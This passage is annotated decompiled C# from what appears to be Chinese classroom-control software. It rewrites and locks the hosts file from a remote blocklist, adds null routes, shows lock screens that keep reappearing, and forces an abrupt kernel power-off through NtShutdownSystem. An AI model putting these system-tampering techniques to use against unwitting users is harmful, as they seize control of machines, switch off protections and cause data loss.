					try { Interaction.MsgBox("加载一个控件不能成功！检查是否安装了安全卫士、电脑管家、360等杀毒软件，它们会阻止运行！（如果必须要安装，只安装火绒杀毒软件)。技巧：如果你的安装软件列表中并没有杀毒软件，可能是360安全卫士卸载不干净，你可以再次安装360安全卫士然后再卸载它。", MsgBoxStyle.OkOnly, null); }
					catch (Exception) { }
				}
				else if (Operators.CompareString(this.云端域名, "", false) != 0)
				{
					// 配了云端域名 → 顺手把同目录的附加程序 zy.exe 也拉起来
					try { Process.Start(Application.StartupPath + "\\zy.exe"); }
					catch (Exception) { }
				}
			}
		}

		/// <summary>
		/// 「进程是否在运行」——按进程名（不含 <c>.exe</c>）判断有没有同名进程在跑。全类几十处调用。
		/// </summary>
		/// <param name="进程名">进程名，不带扩展名</param>
		/// <returns>存在同名进程返回 <c>true</c></returns>
		// Token: 0x06000050 RID: 80 RVA: 0x00005E84 File Offset: 0x00004084
		private bool 进程是否在运行(string 进程名)
		{
			return Process.GetProcessesByName(进程名).Length > 0;
		}

		/// <summary>
		/// 取有线网卡的 IPv4 地址。
		/// <para>
		/// 遍历所有网卡：只看描述里不含 <c>virtual</c>（排除虚拟网卡）且状态为 <c>Up</c> 的，
		/// 在它的单播地址里找第一个 <c>InterNetwork</c> 且非回环的地址<b>立即返回</b>
		/// （原版走这条快捷路径时连枚举器都没释放，这里照旧）。
		/// </para>
		/// <para>都没有就返回空串；循环里抛出的异常原样上抛（原版的错误分发没有恢复点，等于重抛）。</para>
		/// </summary>
		// Token: 0x06000051 RID: 81 RVA: 0x00005EA4 File Offset: 0x000040A4
		public string GetWiredNetworkIP()
		{
			foreach (NetworkInterface 网卡 in NetworkInterface.GetAllNetworkInterfaces())
			{
				if (!网卡.Description.ToLower().Contains("virtual") && 网卡.OperationalStatus == OperationalStatus.Up)
				{
					IEnumerator<UnicastIPAddressInformation> 地址枚举器 = 网卡.GetIPProperties().UnicastAddresses.GetEnumerator();
					while (地址枚举器.MoveNext())
					{
						UnicastIPAddressInformation 单播地址 = 地址枚举器.Current;
						if (单播地址.Address.AddressFamily == AddressFamily.InterNetwork && !IPAddress.IsLoopback(单播地址.Address))
						{
							return 单播地址.Address.ToString();
						}
					}
					if (地址枚举器 != null)
					{
						地址枚举器.Dispose();
					}
				}
			}
			return string.Empty;
		}

		/// <summary>
		/// 「子串出现次数」——用 <c>InStr</c> 循环统计子串在源串里出现了几次。<b>本工程没有调用点</b>。
		/// </summary>
		/// <param name="子串">要统计的子串</param>
		/// <param name="源串">被搜索的字符串</param>
		/// <returns>出现次数</returns>
		private int 子串出现次数(string 子串, string 源串)
		{
			int 位置 = 1;
			checked
			{
				// 原版这个计数器没有初始化，效果等同于 0
				int 次数 = 0;
				for (;;)
				{
					位置 = Strings.InStr(位置, 源串, 子串, CompareMethod.Binary);
					if (位置 == 0)
					{
						break;
					}
					位置++;
					次数++;
				}
				return 次数;
			}
		}

		/// <summary>
		/// 判定电子教室进程的状态机。
		/// <para>
		/// 没有同名进程 → <c>NotFound</c>；有则遍历全部同名进程，找<b>映像路径等于
		/// <see cref="电子教室程序路径"/></b>（<c>UCase</c> 不分大小写比较）的那一个；
		/// 一个都对不上 → <c>NotFound</c>；找到了但窗口无响应 → <c>NotResponding</c>；
		/// 有线程处于挂起等待 → <c>Suspended</c>；否则 <c>Running</c>。整个过程出异常一律算 <c>NotResponding</c>。
		/// </para>
		/// </summary>
		/// <param name="processName">进程名（不含扩展名）</param>
		/// <returns>进程状态</returns>
		// Token: 0x06000053 RID: 83 RVA: 0x0000604C File Offset: 0x0000424C
		public Form1.ProcessStatus CheckProcessStatus(string processName)
		{
			checked
			{
				Form1.ProcessStatus 状态;
				try
				{
					Process[] 同名进程 = Process.GetProcessesByName(processName);
					if (同名进程.Length == 0)
					{
						状态 = Form1.ProcessStatus.NotFound;
					}
					else
					{
						Process 进程 = 同名进程[0];
						int 上界 = 同名进程.Length - 1;
						int i;
						for (i = 0; i <= 上界; i++)
						{
							进程 = 同名进程[i];
							if (Operators.CompareString(Strings.UCase(进程.MainModule.FileName), Strings.UCase(this.电子教室程序路径), false) == 0)
							{
								break;
							}
						}
						if (i == 同名进程.Length)
						{
							状态 = Form1.ProcessStatus.NotFound;
						}
						else if (进程.Responding)
						{
							if (this.是否有线程被挂起(进程))
							{
								状态 = Form1.ProcessStatus.Suspended;
							}
							else
							{
								状态 = Form1.ProcessStatus.Running;
							}
						}
						else
						{
							状态 = Form1.ProcessStatus.NotResponding;
						}
					}
				}
				catch (Exception ex)
				{
					状态 = Form1.ProcessStatus.NotResponding;
				}
				return 状态;
			}
		}

		/// <summary>
		/// 「是否有线程被挂起」——进程里只要有任一 <c>ProcessThread</c> 处于
		/// <c>Wait</c> + <c>WaitReason.Suspended</c>，就是被挂起的典型特征。
		/// <para>原版在一个 <c>finally</c> 里手工释放枚举器（dnSpy 把变量弄丢了），
		/// 与 <c>foreach</c> 的自动 Dispose 等价，这里交给 <c>foreach</c>。</para>
		/// </summary>
		/// <param name="进程">被检查的进程</param>
		/// <returns>有线程被挂起返回 <c>true</c></returns>
		// Token: 0x06000054 RID: 84 RVA: 0x000060F0 File Offset: 0x000042F0
		private bool 是否有线程被挂起(Process 进程)
		{
			foreach (object obj in 进程.Threads)
			{
				ProcessThread 线程 = (ProcessThread)obj;
				if (线程.ThreadState == global::System.Diagnostics.ThreadState.Wait && 线程.WaitReason == ThreadWaitReason.Suspended)
				{
					return true;
				}
			}
			return false;
		}

		/// <summary>
		/// 「定时显示锁屏」——<c>Timer4</c>（1000 ms）的心跳。
		/// 惩罚链第 3 级：Form4 是全屏锁屏窗，这里每秒确认它还在，被关掉就重新弹出来。
		/// </summary>
		/// <param name="sender">Timer4</param>
		/// <param name="e">事件参数</param>
		// Token: 0x06000055 RID: 85 RVA: 0x000023B3 File Offset: 0x000005B3
		private void 定时显示锁屏(object sender, EventArgs e)
		{
			if (!SetterEvent.ComputeCallback.Form4.Visible)
			{
				SetterEvent.ComputeCallback.Form4.Show();
			}
		}

		/// <summary>
		/// 「窗体关闭清理」——<c>FormClosing</c>：停掉并释放 WMI 新进程监视器。
		/// <para><b>注意</b>：原版<b>没有</b> <c>e.Cancel = true</c>，也就是说窗体是真能被关掉的，
		/// 关掉之后进程监控随之停止。</para>
		/// </summary>
		/// <param name="sender">Form1</param>
		/// <param name="e">关闭事件参数（未被使用）</param>
		// Token: 0x06000056 RID: 86 RVA: 0x00006164 File Offset: 0x00004364
		private void 窗体关闭清理(object sender, FormClosingEventArgs e)
		{
			if (this.新进程监视器 != null)
			{
				this.新进程监视器.Stop();
				this.新进程监视器.Dispose();
			}
		}

		/// <summary>
		/// 「显示违规软件警告」——填好 Form3（惩罚链第 1 级，全屏文字警告）的文案再 <c>Show()</c>。
		/// 由 <see cref="新进程拦截"/> 通过 <c>BeginInvoke</c> 投递到 UI 线程。
		/// <para>
		/// 三套文案：默认「你运行的软件违规！」；关键词命中第 6 项时换成 ctrl+alt+del 注销的提示；
		/// 进程名黑名单命中 17~21（解压软件）时换成禁止解压的提示。
		/// 密码隔断 <c>w4yw4y3tq3yszz</c> + 进程名 + <c>mmfnfxhghrts</c> 是该程序与作者约定的联系方式串。
		/// </para>
		/// </summary>
		// Token: 0x06000057 RID: 87 RVA: 0x00006190 File Offset: 0x00004390
		private void 显示违规软件警告()
		{
			SetterEvent.ComputeCallback.Form3.shuoming.Text = "你运行的软件违规！如有误判，请老师拍照与作者QQ联系。";
			if (this.关键词匹配下标 == 6)
			{
				SetterEvent.ComputeCallback.Form3.shuoming.Text = "注：电脑死机时，不能用任务管理器，可同时按ctrl+alt+del三个键，点 注销 ，电脑不会自动还原。";
			}
			if ((this.进程名匹配下标 >= 17) & (this.进程名匹配下标 <= 21))
			{
				SetterEvent.ComputeCallback.Form3.shuoming.Text = "本电脑禁止使用解压软件，如果确有需要，请老师来退出小助手。";
			}
			SetterEvent.ComputeCallback.Form3.shuoming3.Text = "w4yw4y3tq3yszz" + Strings.Replace(this.触发进程名, ".exe", "", 1, -1, CompareMethod.Binary) + "mmfnfxhghrts";
			SetterEvent.ComputeCallback.Form3.Show();
		}

		/// <summary>
		/// 「显示杀毒软件警告」——填好 Form2（惩罚链第 2 级，全屏遮罩 + 密码门）的文案、
		/// <c>Show()</c>，并打开 <c>Timer2</c> 让它每秒复弹、关不掉。
		/// </summary>
		// Token: 0x06000058 RID: 88 RVA: 0x00006258 File Offset: 0x00004458
		private void 显示杀毒软件警告()
		{
			SetterEvent.ComputeCallback.Form2.shuoming.Text = "你运行了杀毒类的软件，危害电子教室的运行！如果你必须要用火绒杀毒软件，要设置：'允许火绒杀毒'。如有误判，请老师拍照与作者QQ联系。";
			SetterEvent.ComputeCallback.Form2.shuoming3.Text = "gyhrw4yw4y3tq3yszz" + Strings.Replace(this.触发进程名, ".exe", "", 1, -1, CompareMethod.Binary) + "mmfnfxhghrts";
			SetterEvent.ComputeCallback.Form2.Show();
			this.Timer2.Enabled = true;
		}

		/// <summary>
		/// 「下载并写入hosts黑名单」——<b>封网核心</b>，由 <see cref="主循环_分阶段启动"/> 与
		/// <see cref="定时刷新hosts"/> 反复调用。
		/// <list type="number">
		/// <item>先探 <c>www.baidu.com:443</c>（2000 ms）：不通就说明没网，置 <see cref="hosts已写入"/> = false 返回；</item>
		/// <item>把云端名单下到 <c>c:\1.txt</c>；第一行不含 <c>www.</c> 视为无效名单，直接返回；</item>
		/// <item>扫三个中文标记 <c>视频网站：</c> / <c>产品名：</c> / <c>IP地址：</c>，各记下「标记前一行」与「标记后一行」；</item>
		/// <item>把 hosts 属性改成 Normal（连写两次，对付只读/隐藏位），读出已有
		/// <c>127.0.0.1 &lt;域名&gt;</c> 的行收进 HashSet，避免重复写；</item>
		/// <item>段 1：0 行到「视频网站」标记前一行，逐行归一化成域名（去 <c>http://</c>/<c>https://</c>/路径、转小写），
		/// 没被封过就 <c>AppendLine("127.0.0.1 " + 域名)</c>；</item>
		/// <item>段 2（仅当 <paramref name="模式"/> 为 <c>off</c>）：「视频网站」到「产品名」之间同样处理；</item>
		/// <item>段 3：「产品名」到「IP地址」之间的行<b>追加进 <see cref="关键词黑名单"/></b>——
		/// 也就是<b>服务端可以远程扩充进程猎杀范围</b>；</item>
		/// <item>删掉 <c>IFEO\route.exe</c> 劫持键；段 4：「IP地址」到末行逐条
		/// <c>route add &lt;IP&gt; mask 255.255.255.255 0.0.0.0 metric 1</c> 加<b>黑洞路由</b>；</item>
		/// <item>写回 hosts、置 <see cref="hosts已写入"/> = true、把 hosts 设成
		/// <c>ReadOnly | Hidden | System</c>（学生自己改不动）；</item>
		/// <item>放开 <c>DisableCMD</c>、<c>ipconfig /flushdns</c> 让封禁立即生效。</item>
		/// </list>
		/// </summary>
		/// <param name="名单地址">名单 URL：<c>http://&lt;云端域名&gt;/hmd_net.txt</c></param>
		/// <param name="模式">传 <c>"off"</c> 时额外处理「视频网站」段</param>
		// Token: 0x06000059 RID: 89 RVA: 0x000062D4 File Offset: 0x000044D4
		private void 下载并写入hosts黑名单(string 名单地址, string 模式)
		{
			checked
			{
				int 行号 = 0;
				if (!this.IsPortOpen("www.baidu.com", 443, 2000))
				{
					// 连百度 443 都不通 → 当作没网，本轮放弃
					this.hosts已写入 = false;
					return;
				}
				string 临时文件 = "c:\\1.txt";
				try
				{
					using (WebClient 下载客户端 = new WebClient())
					{
						下载客户端.DownloadFile(名单地址, 临时文件);
					}
				}
				catch (Exception) { }
				string[] 名单行;
				try { 名单行 = File.ReadAllLines(临时文件); }
				catch (Exception)
				{
					return;
				}
				if (Strings.InStr(名单行[0], "www.", CompareMethod.Binary) == 0)
				{
					// 首行没有 www. → 拿到的不是有效名单
					this.hosts已写入 = false;
					return;
				}
				// —— 扫三个中文标记，记住「标记前一行 / 标记后一行」的行号 ——
				// 原版这几个变量没初始化，没扫到标记时按 0 用，这里显式给 0
				行号 = 0;
				int 视频标记前 = 0;
				int 视频标记后 = 0;
				int 产品标记前 = 0;
				int 产品标记后 = 0;
				int IP标记前 = 0;
				int IP标记后 = 0;
				foreach (string 行文本 in 名单行)
				{
					if (Operators.CompareString(行文本, "视频网站：", false) == 0)
					{
						视频标记前 = 行号 - 1;
						视频标记后 = 行号 + 1;
					}
					if (Operators.CompareString(行文本, "产品名：", false) == 0)
					{
						产品标记前 = 行号 - 1;
						产品标记后 = 行号 + 1;
					}
					if (Operators.CompareString(行文本, "IP地址：", false) == 0)
					{
						IP标记前 = 行号 - 1;
						IP标记后 = 行号 + 1;
					}
					行号++;
				}
				int 末行号 = 行号 - 1;
				// hosts 可能是只读/隐藏/系统的，先清属性（原版连写两次）
				try { File.SetAttributes(this.hosts路径, FileAttributes.Normal); }
				catch (Exception) { }
				try { File.SetAttributes(this.hosts路径, FileAttributes.Normal); }
				catch (Exception) { }
				string 原hosts;
				try { 原hosts = File.ReadAllText(this.hosts路径); }
				catch (Exception)
				{
					return;
				}
				HashSet<string> 已封域名 = new HashSet<string>();
				string[] hosts行 = 原hosts.Split(new string[] { Environment.NewLine }, StringSplitOptions.None);
				// 先收集现有 hosts 里已经写成 "127.0.0.1 <域名>" 的域名
				foreach (string hosts行文本 in hosts行)
				{
					if (hosts行文本.Trim().StartsWith("127.0.0.1"))
					{
						string[] 分段 = hosts行文本.Trim().Split(new char[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
						if (分段.Length > 1)
						{
							已封域名.Add(分段[1].ToLower());
						}
					}
				}
				StringBuilder 构造器 = new StringBuilder(原hosts);
				构造器.AppendLine();
				// —— 段 1：名单开头到「视频网站：」标记前一行 ——
				int 视频段上界 = 视频标记前;
				for (int k = 0; k <= 视频段上界; k++)
				{
					if (!string.IsNullOrEmpty(名单行[k].Trim()))
					{
						string 域名 = 名单行[k].Trim().Split(new char[] { '/' })[0].Replace("http://", "").Replace("https://", "").ToLower();
						if (!已封域名.Contains(域名))
						{
							构造器.AppendLine("127.0.0.1 " + 域名);
						}
					}
				}
				// —— 段 2：只有模式为 off 时，才处理「视频网站：」到「产品名：」之间 ——
				if (Operators.CompareString(模式, "off", false) == 0)
				{
					int 视频段起点 = 视频标记后;
					int 视频段终点 = 产品标记前;
					for (int l = 视频段起点; l <= 视频段终点; l++)
					{
						if (!string.IsNullOrEmpty(名单行[l].Trim()))
						{
							string 域名2 = 名单行[l].Trim().Split(new char[] { '/' })[0].Replace("http://", "").Replace("https://", "").ToLower();
							if (!已封域名.Contains(域名2))
							{
								构造器.AppendLine("127.0.0.1 " + 域名2);
							}
						}
					}
				}
				// —— 段 3：「产品名：」到「IP地址：」之间的行追加进关键词黑名单（服务端远程扩表）——
				int 关键词写入下标 = this.关键词表上界 + 1;
				int 产品段起点 = 产品标记后;
				int 产品段终点 = IP标记前;
				for (int m = 产品段起点; m <= 产品段终点; m++)
				{
					this.关键词黑名单[关键词写入下标] = 名单行[m];
					关键词写入下标++;
				}
				// 清掉学生可能留下的 route.exe 劫持键
				try { ThreadEvent.RateCallback(Registry.LocalMachine, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\route.exe"); }
				catch (Exception) { }
				// —— 段 4：「IP地址：」到末行，逐条加黑洞路由（注意 "add" 后面是两个空格）——
				int IP段起点 = IP标记后;
				int IP段终点 = 末行号;
				for (int n = IP段起点; n <= IP段终点; n++)
				{
					string IP行 = 名单行[n];
					try { Interaction.Shell("route add  " + IP行 + " mask 255.255.255.255 0.0.0.0 metric 1", AppWinStyle.Hide, true, -1); }
					catch (Exception) { }
				}
				try { File.WriteAllText(this.hosts路径, 构造器.ToString()); }
				catch (Exception) { }
				this.hosts已写入 = true;
				// 把 hosts 锁成只读 + 隐藏 + 系统，防学生改回来
				try { File.SetAttributes(this.hosts路径, File.GetAttributes(this.hosts路径) | FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System); }
				catch (Exception) { }
				try { ThreadEvent.EnableCallback(Registry.CurrentUser, "Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", 0, RegistryValueKind.DWord); }
				catch (Exception) { }
				try { Interaction.Shell("ipconfig /flushdns", AppWinStyle.Hide, true, -1); }
				catch (Exception) { }
			}
		}

		/// <summary>
		/// 「Ping主机可达」——先看本机有没有网络，再 <c>Ping.Send</c> 探活。<b>本工程没有调用点</b>
		/// （真正在用探网的是 <see cref="IsPortOpen"/>）。
		/// </summary>
		/// <param name="主机">目标主机名或 IP</param>
		/// <param name="超时">超时毫秒数</param>
		/// <returns>可达返回 <c>true</c></returns>
		// Token: 0x0600005A RID: 90 RVA: 0x000068E4 File Offset: 0x00004AE4
		private bool Ping主机可达(string 主机, int 超时)
		{
			bool 可达;
			if (!NetworkInterface.GetIsNetworkAvailable())
			{
				可达 = false;
				return 可达;
			}
			try
			{
				可达 = new Ping().Send(主机, 超时).Status == IPStatus.Success;
			}
			catch (Exception ex)
			{
				可达 = false;
			}
			return 可达;
		}

		/// <summary>
		/// TCP 端口探活：<c>BeginConnect</c> + 等 <paramref name="timeout"/> 毫秒 + <c>EndConnect</c>，
		/// 返回 <c>tcpClient.Connected</c>。异常一律当作不通。
		/// <para><see cref="下载并写入hosts黑名单"/> 就是靠它探 <c>www.baidu.com:443</c> 来判断有没有网的。</para>
		/// </summary>
		/// <param name="hostname">目标主机名</param>
		/// <param name="port">目标端口</param>
		/// <param name="timeout">超时毫秒数，默认 2000</param>
		/// <returns>端口可连返回 <c>true</c></returns>
		// Token: 0x0600005B RID: 91 RVA: 0x0000693C File Offset: 0x00004B3C
		public bool IsPortOpen(string hostname, int port, int timeout = 2000)
		{
			bool 已连接;
			try
			{
				using (TcpClient 客户端 = new TcpClient())
				{
					IAsyncResult 异步结果 = 客户端.BeginConnect(hostname, port, null, null);
					if (异步结果.AsyncWaitHandle.WaitOne(TimeSpan.FromMilliseconds((double)timeout)))
					{
						客户端.EndConnect(异步结果);
						已连接 = 客户端.Connected;
					}
					else
					{
						已连接 = false;
					}
				}
			}
			catch (Exception ex)
			{
				已连接 = false;
			}
			return 已连接;
		}

		/// <summary>
		/// 「强制关机」——<b>破坏性最强的一段</b>。
		/// 先 <c>RtlAdjustPrivilege(19, 1, 0, ref 0)</c> 打开 <c>SeShutdownPrivilege</c>，
		/// 再 <c>NtShutdownSystem(2)</c> 走内核关机（<c>ShutdownPowerOff</c>），
		/// 不经过正常的关机流程，程序没有保存或拦截的机会。
		/// </summary>
		// Token: 0x0600005C RID: 92 RVA: 0x000069BC File Offset: 0x00004BBC
		public static void 强制关机()
		{
			int 原状态 = 0;
			Form1.RtlAdjustPrivilege(19, 1, 0, ref 原状态);
			Form1.NtShutdownSystem(2);
		}

		/// <summary>
		/// 释放窗体持有的组件容器（14 个定时器都装在它里面），随后交回基类释放。
		/// </summary>
		/// <param name="disposing"><c>true</c> 表示由代码主动调用</param>
		// Token: 0x0600005D RID: 93 RVA: 0x000069E0 File Offset: 0x00004BE0
		protected override void Dispose(bool disposing)
		{
			try
			{
				if (disposing && this.组件容器 != null)
				{
					this.组件容器.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		/// <summary>
		/// 「初始化组件」——设计器生成的 <c>InitializeComponent</c> 展开版：建 14 个定时器并设间隔。
		/// <para>
		/// 间隔：<c>Timer1</c> 6000、<c>Timer2</c> 1000、<c>Timer_main</c> 6000、<c>Timer_usb</c> 5000、
		/// <c>Timer_dzjs</c> 16000、<c>Timer_wangluo</c> 17000、<c>Timer_jcm</c> 5000、
		/// <c>Timer_fhq</c> 13000、<c>Timer_qdx</c> 3000、<c>Timer4</c> 1000、<c>Timer_jiyu</c> 15000、
		/// <c>Timer3</c> 1000、<c>Timer_updatehosts</c> 30000、<c>Timer_route</c> 11000。
		/// 其中 <c>Timer_jcm</c> / <c>Timer3</c> / <c>Timer_route</c> 空转，只有 <c>Timer_main</c> 一开始就启用。
		/// </para>
		/// <para>窗体设成无边框、最小化、不在任务栏显示——整个程序是隐藏后台常驻的。</para>
		/// </summary>
		// Token: 0x0600005E RID: 94 RVA: 0x00006A20 File Offset: 0x00004C20
		private void 初始化组件()
		{
			this.组件容器 = new Container();
			this.Timer1 = new global::System.Windows.Forms.Timer(this.组件容器);
			this.Timer2 = new global::System.Windows.Forms.Timer(this.组件容器);
			this.Timer_main = new global::System.Windows.Forms.Timer(this.组件容器);
			this.Timer_usb = new global::System.Windows.Forms.Timer(this.组件容器);
			this.Timer_dzjs = new global::System.Windows.Forms.Timer(this.组件容器);
			this.Timer_wangluo = new global::System.Windows.Forms.Timer(this.组件容器);
			this.Timer_jcm = new global::System.Windows.Forms.Timer(this.组件容器);
			this.Timer_fhq = new global::System.Windows.Forms.Timer(this.组件容器);
			this.Timer_qdx = new global::System.Windows.Forms.Timer(this.组件容器);
			this.Timer4 = new global::System.Windows.Forms.Timer(this.组件容器);
			this.Timer_jiyu = new global::System.Windows.Forms.Timer(this.组件容器);
			this.Timer3 = new global::System.Windows.Forms.Timer(this.组件容器);
			this.Timer_updatehosts = new global::System.Windows.Forms.Timer(this.组件容器);
			this.Timer_route = new global::System.Windows.Forms.Timer(this.组件容器);
			base.SuspendLayout();
			this.Timer1.Interval = 6000;
			this.Timer2.Interval = 1000;
			this.Timer_main.Enabled = true;
			this.Timer_main.Interval = 6000;
			this.Timer_usb.Interval = 5000;
			this.Timer_dzjs.Interval = 16000;
			this.Timer_wangluo.Interval = 17000;
			this.Timer_jcm.Interval = 5000;
			this.Timer_fhq.Interval = 13000;
			this.Timer_qdx.Interval = 3000;
			this.Timer4.Interval = 1000;
			this.Timer_jiyu.Interval = 15000;
			this.Timer3.Interval = 1000;
			this.Timer_updatehosts.Interval = 30000;
			this.Timer_route.Interval = 11000;
			base.AutoScaleDimensions = new SizeF(6f, 12f);
			base.AutoScaleMode = AutoScaleMode.Font;
			base.ClientSize = new Size(384, 379);
			base.FormBorderStyle = FormBorderStyle.None;
			base.Name = "Form1";
			base.ShowInTaskbar = false;
			base.WindowState = FormWindowState.Minimized;
			base.ResumeLayout(false);
		}

		/// <summary><c>Timer1</c>（6000 ms）——服务守护与自更新。</summary>
		// Token: 0x1700000E RID: 14
		// (get) Token: 0x0600005F RID: 95 RVA: 0x000023D5 File Offset: 0x000005D5
		// (set) Token: 0x06000060 RID: 96 RVA: 0x00006C70 File Offset: 0x00004E70
		internal virtual global::System.Windows.Forms.Timer Timer1
		{
			[CompilerGenerated]
			get
			{
				return this.m_TestsEvent;
			}
			[CompilerGenerated]
			set
			{
				EventHandler eventHandler = new EventHandler(this.服务守护与自更新);
				global::System.Windows.Forms.Timer timer = this.m_TestsEvent;
				if (timer != null)
				{
					timer.Tick -= eventHandler;
				}
				this.m_TestsEvent = value;
				timer = this.m_TestsEvent;
				if (timer != null)
				{
					timer.Tick += eventHandler;
				}
			}
		}

		/// <summary><c>Timer2</c>（1000 ms）——定时复弹 Form2 警告窗（惩罚链第 2 级）。</summary>
		// Token: 0x1700000F RID: 15
		// (get) Token: 0x06000061 RID: 97 RVA: 0x000023DD File Offset: 0x000005DD
		// (set) Token: 0x06000062 RID: 98 RVA: 0x00006CB4 File Offset: 0x00004EB4
		internal virtual global::System.Windows.Forms.Timer Timer2
		{
			[CompilerGenerated]
			get
			{
				return this.m_ConsumerEvent;
			}
			[CompilerGenerated]
			set
			{
				EventHandler eventHandler = new EventHandler(this.定时显示警告窗);
				global::System.Windows.Forms.Timer timer = this.m_ConsumerEvent;
				if (timer != null)
				{
					timer.Tick -= eventHandler;
				}
				this.m_ConsumerEvent = value;
				timer = this.m_ConsumerEvent;
				if (timer != null)
				{
					timer.Tick += eventHandler;
				}
			}
		}

		/// <summary><c>Timer_main</c>（6000 ms）——主心跳，初始化期分阶段启动监视器。</summary>
		// Token: 0x17000010 RID: 16
		// (get) Token: 0x06000063 RID: 99 RVA: 0x000023E5 File Offset: 0x000005E5
		// (set) Token: 0x06000064 RID: 100 RVA: 0x00006CF8 File Offset: 0x00004EF8
		internal virtual global::System.Windows.Forms.Timer Timer_main
		{
			[CompilerGenerated]
			get
			{
				return this._RulesEvent;
			}
			[CompilerGenerated]
			set
			{
				EventHandler eventHandler = new EventHandler(this.主循环_分阶段启动);
				global::System.Windows.Forms.Timer timer = this._RulesEvent;
				if (timer != null)
				{
					timer.Tick -= eventHandler;
				}
				this._RulesEvent = value;
				timer = this._RulesEvent;
				if (timer != null)
				{
					timer.Tick += eventHandler;
				}
			}
		}

		/// <summary><c>Timer_usb</c>（5000 ms）——检查 U 盘（usbstor）禁用状态。</summary>
		// Token: 0x17000011 RID: 17
		// (get) Token: 0x06000065 RID: 101 RVA: 0x000023ED File Offset: 0x000005ED
		// (set) Token: 0x06000066 RID: 102 RVA: 0x00006D3C File Offset: 0x00004F3C
		internal virtual global::System.Windows.Forms.Timer Timer_usb
		{
			[CompilerGenerated]
			get
			{
				return this._ServiceEvent;
			}
			[CompilerGenerated]
			set
			{
				EventHandler eventHandler = new EventHandler(this.检查USB存储禁用);
				global::System.Windows.Forms.Timer timer = this._ServiceEvent;
				if (timer != null)
				{
					timer.Tick -= eventHandler;
				}
				this._ServiceEvent = value;
				timer = this._ServiceEvent;
				if (timer != null)
				{
					timer.Tick += eventHandler;
				}
			}
		}

		/// <summary><c>Timer_dzjs</c>（16000 ms）——电子教室进程监控（会强制关机的那条链）。</summary>
		// Token: 0x17000012 RID: 18
		// (get) Token: 0x06000067 RID: 103 RVA: 0x000023F5 File Offset: 0x000005F5
		// (set) Token: 0x06000068 RID: 104 RVA: 0x00006D80 File Offset: 0x00004F80
		internal virtual global::System.Windows.Forms.Timer Timer_dzjs
		{
			[CompilerGenerated]
			get
			{
				return this.m_RepositoryEvent;
			}
			[CompilerGenerated]
			set
			{
				EventHandler eventHandler = new EventHandler(this.电子教室进程监控);
				global::System.Windows.Forms.Timer timer = this.m_RepositoryEvent;
				if (timer != null)
				{
					timer.Tick -= eventHandler;
				}
				this.m_RepositoryEvent = value;
				timer = this.m_RepositoryEvent;
				if (timer != null)
				{
					timer.Tick += eventHandler;
				}
			}
		}

		/// <summary><c>Timer_wangluo</c>（17000 ms）——网络连接监控（断网 / IP 变更）。</summary>
		// Token: 0x17000013 RID: 19
		// (get) Token: 0x06000069 RID: 105 RVA: 0x000023FD File Offset: 0x000005FD
		// (set) Token: 0x0600006A RID: 106 RVA: 0x00006DC4 File Offset: 0x00004FC4
		internal virtual global::System.Windows.Forms.Timer Timer_wangluo
		{
			[CompilerGenerated]
			get
			{
				return this.objectEvent;
			}
			[CompilerGenerated]
			set
			{
				EventHandler eventHandler = new EventHandler(this.网络连接监控);
				global::System.Windows.Forms.Timer timer = this.objectEvent;
				if (timer != null)
				{
					timer.Tick -= eventHandler;
				}
				this.objectEvent = value;
				timer = this.objectEvent;
				if (timer != null)
				{
					timer.Tick += eventHandler;
				}
			}
		}

		/// <summary><c>Timer_jcm</c>（5000 ms）——建了但<b>没有任何事件处理器、也从不启用</b>，空转。</summary>
		// Token: 0x17000014 RID: 20
		// (get) Token: 0x0600006B RID: 107 RVA: 0x00002405 File Offset: 0x00000605
		// (set) Token: 0x0600006C RID: 108 RVA: 0x0000240D File Offset: 0x0000060D
		internal virtual global::System.Windows.Forms.Timer Timer_jcm { get; set; }

		/// <summary><c>Timer_fhq</c>（13000 ms）——防火墙监控（发现开着就强制关掉）。</summary>
		// Token: 0x17000015 RID: 21
		// (get) Token: 0x0600006D RID: 109 RVA: 0x00002416 File Offset: 0x00000616
		// (set) Token: 0x0600006E RID: 110 RVA: 0x00006E08 File Offset: 0x00005008
		internal virtual global::System.Windows.Forms.Timer Timer_fhq
		{
			[CompilerGenerated]
			get
			{
				return this._ConfigEvent;
			}
			[CompilerGenerated]
			set
			{
				EventHandler eventHandler = new EventHandler(this.防火墙监控);
				global::System.Windows.Forms.Timer timer = this._ConfigEvent;
				if (timer != null)
				{
					timer.Tick -= eventHandler;
				}
				this._ConfigEvent = value;
				timer = this._ConfigEvent;
				if (timer != null)
				{
					timer.Tick += eventHandler;
				}
			}
		}

		/// <summary><c>Timer_qdx</c>（3000 ms）——口令与自启动项监控（被改就写回）。</summary>
		// Token: 0x17000016 RID: 22
		// (get) Token: 0x0600006F RID: 111 RVA: 0x0000241E File Offset: 0x0000061E
		// (set) Token: 0x06000070 RID: 112 RVA: 0x00006E4C File Offset: 0x0000504C
		internal virtual global::System.Windows.Forms.Timer Timer_qdx
		{
			[CompilerGenerated]
			get
			{
				return this._ManagerEvent;
			}
			[CompilerGenerated]
			set
			{
				EventHandler eventHandler = new EventHandler(this.口令与自启动项监控);
				global::System.Windows.Forms.Timer timer = this._ManagerEvent;
				if (timer != null)
				{
					timer.Tick -= eventHandler;
				}
				this._ManagerEvent = value;
				timer = this._ManagerEvent;
				if (timer != null)
				{
					timer.Tick += eventHandler;
				}
			}
		}

		/// <summary><c>Timer4</c>（1000 ms）——定时复弹 Form4 锁屏窗（惩罚链第 3 级）。</summary>
		// Token: 0x17000017 RID: 23
		// (get) Token: 0x06000071 RID: 113 RVA: 0x00002426 File Offset: 0x00000626
		// (set) Token: 0x06000072 RID: 114 RVA: 0x00006E90 File Offset: 0x00005090
		internal virtual global::System.Windows.Forms.Timer Timer4
		{
			[CompilerGenerated]
			get
			{
				return this.registryEvent;
			}
			[CompilerGenerated]
			set
			{
				EventHandler eventHandler = new EventHandler(this.定时显示锁屏);
				global::System.Windows.Forms.Timer timer = this.registryEvent;
				if (timer != null)
				{
					timer.Tick -= eventHandler;
				}
				this.registryEvent = value;
				timer = this.registryEvent;
				if (timer != null)
				{
					timer.Tick += eventHandler;
				}
			}
		}

		/// <summary><c>Timer_jiyu</c>（15000 ms）——极域监控（参数 + 两个服务）。</summary>
		// Token: 0x17000018 RID: 24
